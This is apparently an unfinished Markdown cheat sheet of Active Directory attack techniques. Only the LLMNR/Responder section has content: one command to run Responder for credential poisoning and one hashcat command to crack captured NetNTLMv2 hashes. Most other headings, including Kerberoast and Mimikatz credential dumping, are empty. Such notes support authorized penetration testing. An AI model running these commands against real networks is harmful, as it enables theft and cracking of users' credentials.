# Basic AD Attacks
### LLMNR/Responder
Start Responder
```bash
sudo Responder -I <iface> -dwP
```
Crack w/ hashmode 5600 in hashcat
```bash
hashcat -a 0 -m 5600 <hashfile> <wordlist>
```
### SMB Relay
SMB Signing must be disabled or not enforced
### IPv6 DNS TakeOver

### Passback Attacks

### Pass the Hash (PTH)

### Kerberoast

### Token Impersonation

### LNK File Attacks

### Credential Dumping (Mimikatz)

